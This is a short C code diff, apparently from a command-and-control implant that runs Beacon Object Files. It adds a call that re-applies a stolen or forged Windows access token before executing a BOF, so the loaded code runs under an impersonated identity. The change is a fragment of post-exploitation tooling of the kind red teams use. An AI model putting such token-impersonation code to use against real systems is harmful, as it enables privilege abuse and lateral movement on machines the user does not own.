@@ -7,6 +7,7 @@
 #include "BeaconCompatibility.h"
 #include "Utils.h"
 #include "Debug.h"
+#include "Identity.h"
 
 #include <string.h>
 #include <stdlib.h>
@@ -499,6 +500,9 @@ VOID InlineExecute(PCHAR taskUuid, PPARSER arguments)
         PackageError(taskUuid, ERROR_INVALID_PARAMETER);
         return;
     }
+
+    /* Re-apply stolen/made token so the BOF thread is impersonating. */
+    IdentityImpersonateToken();
 
     /* Execute the BOF with pre-packed arguments */
     if ( !RunCOFF(BofData, &bofLen, "go", BofArgs, argLen) ) 
